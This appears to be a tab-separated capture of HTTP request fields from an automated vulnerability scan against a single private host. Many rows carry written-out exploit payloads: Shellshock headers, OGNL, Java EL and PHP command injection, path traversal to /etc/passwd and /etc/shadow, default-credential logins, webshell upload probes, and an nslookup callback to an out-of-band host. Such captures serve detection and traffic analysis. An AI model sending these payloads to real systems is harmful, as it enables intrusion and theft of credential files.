http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
	gzip																close		133	133	application/json; charset=utf-8						192.168.1.104														http://192.168.1.104/manage/account/login?redirect=%2Fmanage	1	http://192.168.1.104/web/api/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/api/login
	gzip																close		822	822	application/json						192.168.1.104															1	http://192.168.1.104/web/druid/indexer/v1/sampler		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/druid/indexer/v1/sampler
*/*	gzip	en															close										192.168.1.104														() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	1	http://192.168.1.104/web/cgi-bin/stats		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36			() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	/web/cgi-bin/stats
	gzip																close		170	170	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/
	gzip																close		280	280	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ws_utc/resources/setting/options		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/ws_utc/resources/setting/options
*/*	gzip	en															close		48	48	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/module/login/login.html	1	http://192.168.1.104/web/login		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/login
	gzip																close		49	49	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/login.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/uploads/elfinder/elfinder-cke.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/uploads/elfinder/elfinder-cke.html
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/version.web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/version.web
	gzip																close		205	205	text/xml; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/EemAdminService/EemAdmin		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/EemAdminService/EemAdmin
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Schemas/$%7B%27%27.class.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27js%27%29.eval%28%27java.lang.Runtime.getRuntime%28%29.exec%28%22id%22%29%27%29%7D		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/Schemas/$%7B%27%27.class.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27js%27%29.eval%28%27java.lang.Runtime.getRuntime%28%29.exec%28%22id%22%29%27%29%7D
	gzip																close		1340	1340	multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g						192.168.1.104															1	http://192.168.1.104/web/ws_utc/resources/setting/keystore		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/ws_utc/resources/setting/keystore
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage.action?spaceKey=myproj		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/pages/createpage.action?spaceKey=myproj
application/json, text/plain, */*	gzip																close		2771	2771	multipart/form-data; boundary=----WebKitFormBoundaryreButJNjkCniQExX						192.168.1.104															1	http://192.168.1.104/web/plugin/add		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/plugin/add
	gzip																close		142	142	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/apply_sec.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/apply_sec.cgi
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/templates2/viewpagetemplate.action		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/pages/templates2/viewpagetemplate.action
	gzip		guest:guest						Basic Z3Vlc3Q6Z3Vlc3Q=								close		30	30							192.168.1.104														http://192.168.1.104/web/tools.cgi	1	http://192.168.1.104/web/tools.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/tools.cgi
	gzip																close		93	93	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/login_pic.asp	1	http://192.168.1.104/web/apply_sec.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36			uid=1234123	/web/apply_sec.cgi
	gzip																close		31	31	application/json						192.168.1.104															1	http://192.168.1.104/web/plugin/customMethod		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/plugin/customMethod
*/*	gzip	en															close		101	101							192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wsecure/wsecure-config.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/wp-content/plugins/wsecure/wsecure-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfide-scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/cfide-scripts/ajax/package/cfajax.js
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}
	gzip																close		213	213	multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3						192.168.1.104															1	http://192.168.1.104/web/jars/upload		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/jars/upload
	gzip																close		200	200	application/json; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-json/buddypress/v1/signup		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/wp-json/buddypress/v1/signup
text/javascript, text/html, application/xml, text/xml, */*	gzip, deflate	en-US,en;q=0.5															close		260	260	application/json; charset=UTF-8						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/var		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/var
*/*	gzip	en															close		0	0							192.168.1.104															1	http://192.168.1.104/web/ws/v1/cluster/apps/new-application		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/ws/v1/cluster/apps/new-application
	gzip																close		136	136	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
	gzip		admin:admin						Basic YWRtaW46YWRtaW4=								close		30	30							192.168.1.104														http://192.168.1.104/web/tools.cgi	1	http://192.168.1.104/web/tools.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/tools.cgi
	gzip																close		850	850	multipart/form-data; boundary=---------------------------24464570528145						192.168.1.104															1	http://192.168.1.104/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
	gzip																close		54	54	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/mailingupgrade.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/mailingupgrade.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/;cat$IFS/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/cgi-bin/;cat$IFS/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfmx/CFIDE/scripts/ajax/package/cfajax.js		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/cfmx/CFIDE/scripts/ajax/package/cfajax.js
	gzip																close		400	400	multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/wp-admin/admin-ajax.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/25SnEgaRzmhDNUNeO7b692mCj6W.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/25SnEgaRzmhDNUNeO7b692mCj6W.jsp
	gzip																close		6	6	x-application/hessian						192.168.1.104														https://192.168.1.104	1	http://192.168.1.104/web/mifs/.;/services/LogService		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/mifs/.;/services/LogService
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/simple-file-list/nuclei.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/wp-content/uploads/simple-file-list/nuclei.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
	gzip																close		4938	4938	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData	1	http://192.168.1.104/web/api/jsonws/invoke		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/api/jsonws/invoke
	gzip																close		406	406	application/json						192.168.1.104															1	http://192.168.1.104/web/apisix/admin/routes		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/apisix/admin/routes
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/25SnEcWqu2D9ZvV5C4BzTD0Nful?cmd=id		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/25SnEcWqu2D9ZvV5C4BzTD0Nful?cmd=id
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)
	gzip																close		63	63	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/login.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/cgi-bin/login.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
*/*	gzip																close		95	95	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/install/install.php?step=4		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/install/install.php?step=4
	gzip																close		133	133	application/json; charset=utf-8						192.168.1.104														http://192.168.1.104/manage/account/login?redirect=%2Fmanage	1	http://192.168.1.104/web/api/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/api/login
*/*	gzip	en															close										192.168.1.104														() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	1	http://192.168.1.104/web/cgi-bin/stats		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36			() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	/web/cgi-bin/stats
*/*	gzip	en															close		45	45	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/?s=index/index/index		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/?s=index/index/index
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/install/includes/configure.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/install/includes/configure.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/webadmin/script?command=|%20nslookup%20c8ach799m8v918fkv9igcekctkoyyyyg4.oast.me		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/webadmin/script?command=|%20nslookup%20c8ach799m8v918fkv9igcekctkoyyyyg4.oast.me
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/version.web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/version.web
	gzip																close		205	205	text/xml; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/EemAdminService/EemAdmin		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/EemAdminService/EemAdmin
*/*	gzip	en															close										192.168.1.104														() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	1	http://192.168.1.104/web/cgi-bin/test		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36			() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd	/web/cgi-bin/test
*/*	gzip																close		137	137							192.168.1.104														http://192.168.1.104/web/login.shtml	1	http://192.168.1.104/web/goform/setSysAdm		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/goform/setSysAdm
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Schemas/$%7B%27%27.class.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27js%27%29.eval%28%27java.lang.Runtime.getRuntime%28%29.exec%28%22id%22%29%27%29%7D		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/Schemas/$%7B%27%27.class.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27js%27%29.eval%28%27java.lang.Runtime.getRuntime%28%29.exec%28%22id%22%29%27%29%7D
	gzip																close		49	49	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/login.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/users/sign_in		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/users/sign_in
	gzip																close		87	87							192.168.1.104															1	http://192.168.1.104/web/cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users
*/*	gzip																close		130	130	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/storfs-asup		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/storfs-asup
	gzip																close		1576	1576	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/imc/javax.faces.resource/dynamiccontent.properties.xhtml		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/imc/javax.faces.resource/dynamiccontent.properties.xhtml
image/avif,image/webp,image/apng,image/*,*/*;q=0.8	gzip, deflate																close		185	185	multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv						192.168.1.104															1	http://192.168.1.104/web/Upload/upload_file.php?l=test		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36			think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6	/web/Upload/upload_file.php?l=test
